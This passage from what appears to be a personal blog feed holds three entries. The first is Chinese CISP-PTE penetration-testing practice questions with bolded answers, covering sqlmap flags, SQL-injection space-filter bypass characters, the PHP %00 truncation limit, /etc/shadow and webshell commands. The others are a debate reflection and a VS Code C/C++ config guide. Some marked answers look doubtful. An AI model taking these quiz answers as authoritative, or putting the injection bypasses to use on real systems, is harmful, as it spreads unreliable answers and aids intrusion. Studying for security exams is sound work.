class="hljs-string">&#x27;$key&#x27;</span><br><br>C<br></code></pre></td></tr></table></figure><p>6.张三将微信个人头像换成微信群中某好友头像，并将昵称改为该好友的昵称，然后向该好友的其他好友发送一些欺骗消息。该攻击行为属于以下哪类攻击<br>A.口令攻击</p><p>B.拒绝服务攻击</p><p><strong>C.社会工程学攻击</strong></p><p>D.暴力破解</p><p>7.数据完整性指的是()<br><strong>A.防止非法实体对用户的主动攻击，保证数据接收方收到的信息与发送方发送的信息完全一致</strong></p><p>B.保护网络中个系统之间交换的数据，防止因数据被截获而造成泄密</p><p>C.确保数据是由合法实体发出的</p><p>D.提供连接实体身份的鉴别</p><p>8.以下算法中属于非对称算法的是()<br>A.DES</p><p><strong>B.RSA算法</strong></p><p>C.IDEA</p><p>D.三重DES</p><p>9.信息安全中PDR模型的关键因素是()<br>A.模型</p><p>B.客体</p><p>C.技术</p><p><strong>D.人</strong></p><p>10.数据保密性安全服务的基础是()<br>A.数字签名机制</p><p><strong>B.加密机制</strong></p><p>C.访问控制机制</p><p>D.数据完整性机制</p><p>11.什么是数据库安全的第一道保障()<br>A.操作系统的安全</p><p><strong>B.数据库管理系统层次</strong></p><p>C.网络系统的安全</p><p>D.数据库管理员</p><p>12.在以下认证方式中，最常用的认证方式是：<br><strong>A.基于帐户名&#x2F;口令认证</strong></p><p>B.基于PKI认证</p><p>C.基于摘要算法认证</p><p>D.基于数据库认证</p><p>13.主要用于加密机制的协议是()<br><strong>A.SSL</strong></p><p>B.TELNET</p><p>C.HTTP</p><p>D.FTP</p><p>14.向有限的空间输入超长的字符串是哪一种攻击手段()<br><strong>A.缓冲区溢出</strong></p><p>B.IP欺骗</p><p>C.拒绝服务</p><p>D.网络监听</p><p>15.常规端口扫描和半开放式扫描的区别是?()<br>A.半开式采用UDP方式扫描</p><p>B.没区别</p><p>C扫描准确性不一样</p><p><strong>D.没有完成三次握手， 缺少ACK过程</strong></p><p>16.下列哪类工具是日常用来扫描web漏洞的工具?<br>A.NMAP</p><p><strong>B.IBM APPSCAN</strong></p><p>C.X-SCAN</p><p>D.Nessus</p><p>17.许多黑客攻击都是利用软件实现中的缓冲区溢出的漏洞，对此最可靠的解决方案是什么?<br>A.安装防病毒软件</p><p>B.安装防火墙</p><p><strong>C.给系统安装最新的补丁</strong></p><p>D.安装入侵检测系统</p><p>18.当访问web网站的某个页面资源不存在时， 将会出现的HTTP状态码是?<br>A.200</p><p><strong>B.404</strong></p><p>C.401</p><p>D.302</p><p>19.黑客通过以下哪种攻击方式，可能大批量获取网站注册用户的身份信息()<br><strong>A.越权</strong></p><p>B.XSS</p><p>C.CSRF</p><p>D.以上都可以</p><p>20.在Google Hacking语法中， 下面哪一个是搜索指定类型的文件()<br>A.intitle</p><p>B.intext</p><p><strong>C.filetype</strong></p><p>D.site</p><hr><h3 id="选择题-26"><a href="#选择题-26" class="headerlink" title="选择题 26"></a>选择题 26</h3><p>1.以下关于vpn说法正确的是：<br>A.vpn不能做到信息认证和身份认证</p><p><strong>B.VPN指的是用户通过公用网络建立的临时的，安全的连接</strong></p><p>C.进入QQ VPN只能提供身份认证， 不能提供加密数据的功能</p><p>D.VPN指的用户自己租用线路， 和公共网络物理上完全隔离的安全的线路</p><p>2.以下哪工具不可以抓取http数据包<br>A.fiddler</p><p>B.wireshark</p><p><strong>C.nmap</strong></p><p>D.burp suite</p><p>3.以下哪个数据库不是关系型数据库<br><strong>A.redis</strong></p><p>B.mssql</p><p>C.mysql</p><p>D.oracle</p><p>4.以下命令可以用来获取dns记录的是<br>A.ping</p><p>B.traceroute</p><p><strong>C.dig</strong></p><p>D.who</p><p>5.拿到一个windows下的webshell， 我想看一下主机的名字， 如下命令做不到的是：<br>A.hostname</p><p>B.set</p><p>C.systeminfo</p><p><strong>D.ipconfig &#x2F;all</strong></p><p>6.如何防护存储型xss漏洞<br><strong>A.对html标签进行转义处理</strong></p><p>B.使用安全的浏览器</p><p>C.使用cookie存储身份信息</p><p>D.使用Ajax技术</p><p>7.攻击者截获并记录了从A到B的数据，然后从早些时候所截获的数据中提取信息重放发往B 称为<br>A.口令猜测和字典攻击</p><p>B.强力攻击</p><p><strong>C.回放攻击</strong></p><p>D.中间人攻击</p><p>8.XXe漏洞可以做什么<br>A.获取用户浏览器信息</p><p><strong>B.读取服务器文件</strong></p><p>C.网络钓鱼</p><p>D.盗取用户cookie</p><p>9.TCP会话劫持出了syn flood攻击还需要<br>A.syn扫描</p><p>B.扫描syn&#x2F;ack</p><p>C.扫描TCP</p><p><strong>D.序列号预测</strong></p><p>10.Firefox浏览器插件Hac bar提供的功能没有什么?<br>A.修改浏览器访问referer</p><p>B.BASE 64编码和解码</p><p><strong>C.代理修改WEB页面的内容</strong></p><p>D.POST方式提交数据</p><p>11.以下哪个服务器未曾被发现文件解析漏洞?<br>A.nginx</p><p><strong>B.squid</strong></p><p>C.Apache</p><p>D.IIS</p><p>12.攻击者通过XSS漏洞获取到QQ用户的cookie后， 可以进行一下操作?<br>A.劫持微信用户</p><p>B.偷取Q币</p><p>C.控制用户摄像头</p><p><strong>D.进入QQ空间</strong></p><p>13.linux环境下， 查询日志文件最后100行数据， 正确的方式是()<br>A.grep-100 log</p><p>B.mv-100 log</p><p><strong>C.tail-100 log</strong></p><p>D.cat-100 log</p><p>14.在web页面中增加验证码功能后， 下面说法正确的是()<br>A.可以防止注入攻击</p><p>B.可以防止文件上传漏洞</p><p><strong>C.可以防止数据重复提交正确答案</strong></p><p>D.可以防止文件包含漏洞</p><p>15.设置IP地址MAC绑定的目的?<br>A.加强认证</p><p>B.防止DOS攻击</p><p><strong>C.防止非法接入</strong></p><p>D.防止泄漏网络拓扑</p><p>16.UNIX中， 可以使用下面哪一个代替Telnet， 能完成同样的事情并且更安全?<br><strong>A.SSH</strong></p><p>B.FTP</p><p>C.RLOGON</p><p>D.RHOST</p><p>17.Hash函数的输入长度是?<br>A.512bit</p><p>B.128bit</p><p>C.160bit</p><p><strong>D.任意长度</strong></p><p>18.如果你向一台远程主机发送特定的数据包，却不想远程主机响应你的数据包，这时你使用哪一种类型的进攻手段?<br>A.拒绝服务</p><p>B.缓冲区溢出</p><p><strong>C.地址欺骗</strong></p><p>D.暴力攻击</p><p>19.计算机网络通信时， 利用() 协议获得对方的MAC地址<br><strong>A.ARP</strong></p><p>B.RARP</p><p>C.UDP</p><p>D.TCP</p><p>20.当web服务器访问人数超过了设计访问人数上限， 将可能出现的HTTP状态码是?<br>A.302</p><p>B.200</p><p>C.403</p><p><strong>D.503</strong></p><hr><h3 id="选择题-27"><a href="#选择题-27" class="headerlink" title="选择题 27"></a>选择题 27</h3><p>1.在使用sql map时， 下面那个参数可以指定数据库名称()</p><p>A. -u</p><p><strong>B. -D</strong></p><p>C. -T</p><p>D. -C</p><p>2.SQL注入中空格被过滤的话， 哪些字符不可以替代()</p><p>A.%0a</p><p>B.%09</p><p><strong>C.%08</strong></p><p>D.%0c</p><p>3.为了确保Mysql没有弱口令， 执行下列什么命令可以查看()</p><p><strong>A.select user，password from mysql.user</strong></p><p>B.select mysql，password from admin.user</p><p>C.select admin，password from mysq.user</p><p>D.select password from admin.user</p><p>4.Shell提示符() 代表最高权限用户</p><p>A.@</p><p>B.%</p><p><strong>C.#</strong></p><p>D.$</p><p>5.关于Telnet描述不正确的是()</p><p>A.Telnet是远程登录系统进行管理的程序</p><p>B.缺省情况下telnet使用23端口</p><p>C.可以利用Telnet客户端程序连接到其它端口， 如80端口</p><p><strong>D.Telnet多用于UNIX与Linux系统， 一般不用于Windows系统中</strong></p><p>6.ASPX的网站配置文件一般存放在哪个文件里()</p><p>A.conn.asp </p><p>B.config.php </p><p><strong>C.web.config</strong> </p><p>D.index.aspx</p><p>7.下列哪个协议不属于PHP伪协议()</p><p>A.file:&#x2F;&#x2F;</p><p>B.zip:&#x2F;&#x2F;</p><p><strong>C.fdp:&#x2F;&#x2F;</strong></p><p>D.phar:&#x2F;&#x2F;</p><p>8.文件包含中%00截断， 对PHP版本有什么要求()</p><p>A.PHP版本&gt;5.5.4</p><p>B.PHP版本&lt;5.5.4</p><p>C.PHP版本&lt;5.1.4</p><p><strong>D.PHP版本&lt;5.3.4</strong></p><p>9.PHP中文件包含函数中， 符合“只要程序一运行就包含文件， 找不到被包含的文件时会产生致命错误， 并停止脚本”的函数是</p><p><strong>A.require</strong></p><p>B.include</p><p>C.fopen</p><p>D.include_once</p><p>10.在SQL注入中， 哪种类型的注入不需要闭合字符</p><p>A.单引号注入</p><p><strong>B.整型注入</strong></p><p>C.双引号注入</p><p>D.都有可能</p><p>11.在使用Sql map进行SQL注入时， 我们会使用什么参数来爆所有的数据库名()<br><strong>A、dbs</strong><br>B、columns </p><p>C、curret-db </p><p>D、tables</p><p>12.以下哪些攻击手段是基于应用层的攻击方式()</p><p>A.BGP劫持</p><p>B.ARP攻击</p><p><strong>C.Sniffer嗅探</strong></p><p>D.MAC泛洪</p><p>13.信息系统漏洞主要包括Web方面漏洞，操作系统漏洞， 数据库漏洞三类。以下不属于Web方面漏洞的选项是()</p><p>A.XML外部实体漏洞</p><p>B.反序列化漏洞</p><p>C.任意文件读取漏洞</p><p><strong>D.UAC保护绕过漏洞</strong></p><p>14.在Linux系统中， 日志一般存放在目录&#x2F;var&#x2F;log&#x2F;下， 以下哪个日志文件可以实现记录系统启动后的信息和错误日志()</p><p><strong>A.&#x2F;var&#x2F;log&#x2F;messages</strong> </p><p>B.&#x2F;var&#x2F;log&#x2F;wtmp </p><p>C.&#x2F;var&#x2F;log&#x2F;faillog </p><p>D.&#x2F;var&#x2F;log&#x2F;secure</p><p>15.在Linux系统中， 以下哪个文件可以查看当前系统中账户的密码信息()</p><p><strong>A.&#x2F;etc&#x2F;shadow</strong> </p><p>B.&#x2F;etc&#x2F;sudoers </p><p>C.&#x2F;etc&#x2F;login.defs </p><p>D.&#x2F;etc&#x2F;passwd</p><p>16.关于命令执行漏洞的利用描述错误的是<br>A、System函数可以用来执行一个外部的应用程序， 并将相应的执行结果输出</p><p>B、Exec函数可以用来执行一个外部的应用程序</p><p><strong>C、Shell exec：执行shell命令并返回输出的字符串</strong></p><p>D、Eval函数会将参数字符串作为系统程序代码来执行</p><p>17.防火墙最主要被部署在（）位置</p><p>A.桌面终端</p><p>B.重要服务器</p><p>C.骨干线路</p><p><strong>D.网络边界</strong> </p><p>18.哪一项不是命令执行漏洞的危害（）</p><p><strong>A</strong> 继承WEB服务程序的权限，读写文件 </p><p><strong>B</strong> 反弹SHELL</p><p> <strong>C 对服务器造成大流量攻击</strong> </p><p><strong>D</strong> 控制整个网站 </p><p>19口令机制通常用于（）</p><p><strong>A</strong> 标识 </p><p><strong>B</strong> 注册 </p><p><strong>C</strong> 授权</p><p> <strong>D 认证</strong> </p><p>20.通过修改HTTP Headers中的哪个键值可以伪造来源网址<br>A、Accept </p><p>B、User-Agent </p><p><strong>C、X-Foward ed-For</strong> </p><p>D、Referer</p><hr>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>CISP-PTE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>围观辩论比赛</title>
    <link href="/dong.github/2024/09/21/D-talkcom/"/>
    <url>/dong.github/2024/09/21/D-talkcom/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>终其一生只是个平凡的人，你后悔&#x2F;不后悔？</strong></p><span id="more"></span><p><img src="/dong.github/images/0922.jpg"><br>非常精彩的一次辩论比赛围观。<br>终其一生只是个平凡的人，你后悔吗？<br>什么是平凡，而后悔又是什么？<br>这令我想到了这个：<br><strong>“不经过战斗的舍弃是虚伪的，不经劫难磨炼的超脱是轻佻的，逃避现实的明哲是卑怯的。”</strong><br>这个辩题展开内容还是非常丰富的。<br>最后几位评审的总结真是太好了，下面是视频实录。<br><a href="http://www.donghaixuan.com/2024/09/21/D-talkcom/">跳转主站</a><br><video src="/2024/09/21/D-talkcom/D-talk-0.mp4" position="absolute" width="100%" height="100%" controls="controls"></video><br><video src="/2024/09/21/D-talkcom/D-talk-1.mp4" position="absolute" width="100%" height="100%" controls="controls"></video></p><!-- <div style="position: relative; width: 100%; height: 100%; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=201033992&bvid=BV1dz411i75o&cid=203132924&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe></div> --><p>后悔是一种态度，而不后悔是一种判断。什么时候看山是山。<br>-欲买桂花同载酒，终不似，少年游。</p>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vscode C/C++编程指南</title>
    <link href="/dong.github/2024/09/20/Vscodesolutions/"/>
    <url>/dong.github/2024/09/20/Vscodesolutions/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>优雅地使用Vscode进行C&#x2F;C++编程指南,存储配置文件</strong></p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍:"></a>介绍:</h1><p>使用前请根据配置文件下载并将编译器mingw放在合适位置，根据配置文件进行修改和调整。<br>以下配置项目可供C&#x2F;C++单文件程序日常使用。</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/dong.github/images/0920-1.png" alt="配置所需插件"></div><div class="group-image-wrap"><img src="/dong.github/images/0920-2.png" alt="配置目录结构"></div></div></div><h1 id="配置文件-vscodecpp"><a href="#配置文件-vscodecpp" class="headerlink" title="配置文件(vscodecpp):"></a>配置文件(vscodecpp):</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>c_cpp_properties.json      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;win&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;includePath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;D:/programs/mingw/include&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;defines&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;compilerPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/programs/mingw/bin/g++.exe&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;cStandard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c11&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;cppStandard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c++11&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;intelliSenseMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;clang-x64&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">        <div class="fold-arrow">▶</div>launch.json      </div>      <div class="fold-collapse collapse" id="collapse-dcdac752">        <div class="fold-content">          <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// https://github.com/Microsoft/vscode-cpptools/blob/master/launch.md</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;(gdb) Launch&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 配置名称，将会在启动配置的下拉菜单中显示</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cppdbg&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 配置类型，cppdbg对应cpptools提供的调试功能；可以认为此处只能是cppdbg</span><br>            <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 请求配置类型，可以为launch（启动）或attach（附加）</span><br>            <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 将要进行调试的程序的路径</span><br>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 程序调试时传递给程序的命令行参数，一般设为空即可</span><br>            <span class="hljs-attr">&quot;stopAtEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 设为true时程序将暂停在程序入口处，相当于在main上打断点</span><br>            <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 调试程序时的工作目录，此为工作区文件夹；改成$&#123;fileDirname&#125;可变为文件所在目录</span><br>            <span class="hljs-attr">&quot;environment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 环境变量</span><br>            <span class="hljs-attr">&quot;externalConsole&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 为true时使用单独的cmd窗口，与其它IDE一致；18年10月后设为false可调用VSC内置终端</span><br>            <span class="hljs-attr">&quot;internalConsoleOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;neverOpen&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 如果不设为neverOpen，调试时会跳到“调试控制台”选项卡，你应该不需要对gdb手动输命令吧？</span><br>            <span class="hljs-attr">&quot;MIMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gdb&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 指定连接的调试器，可以为gdb或lldb。但我没试过lldb</span><br>            <span class="hljs-attr">&quot;miDebuggerPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gdb.exe&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 调试器路径，Windows下后缀不能省略，Linux下则不要</span><br>            <span class="hljs-attr">&quot;setupCommands&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// 模板自带，好像可以更好地显示STL容器的内容，具体作用自行Google</span><br>                    <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Enable pretty-printing for gdb&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;-enable-pretty-printing&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;ignoreFailures&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;preLaunchTask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Compile&quot;</span> <span class="hljs-comment">// 调试会话开始前执行的任务，一般为编译程序。与tasks.json的label相对应</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">        <div class="fold-arrow">▶</div>settings.json      </div>      <div class="fold-collapse collapse" id="collapse-6ae3e036">        <div class="fold-content">          <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;files.defaultLanguage&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ctrl+N新建文件后默认的语言</span><br>  <span class="hljs-attr">&quot;editor.formatOnType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 输入分号(C/C++的语句结束标识)后自动格式化当前这一行的代码</span><br>  <span class="hljs-attr">&quot;files.autoSave&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;onFocusChange&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;editor.formatOnSave&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;editor.formatOnPaste&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;editor.acceptSuggestionOnEnter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 我个人的习惯，按回车时一定是真正的换行，只有tab才会接受Intellisense</span><br>  <span class="hljs-attr">&quot;editor.minimap.enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;C_Cpp.autocomplete&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;[cpp]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;editor.quickSuggestions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;comments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;strings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;other&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;editor.wordBasedSuggestions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;matchingDocuments&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;editor.formatOnType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;[c]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;editor.quickSuggestions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;comments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;strings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;other&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;editor.wordBasedSuggestions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;matchingDocuments&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;editor.formatOnType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;code-runner.runInTerminal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 设置成false会在“输出”中输出，无法输入</span><br>  <span class="hljs-attr">&quot;code-runner.executorMap&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">//&quot;c&quot;: &quot;cd $dir &amp;&amp; gcc $fileName -o $fileNameWithoutExt.exe -Wall -g -O2 -static-libgcc  -fexec-charset=GBK &amp;&amp; $dir$fileNameWithoutExt&quot;,</span><br>    <span class="hljs-comment">//&quot;cpp&quot;: &quot;cd 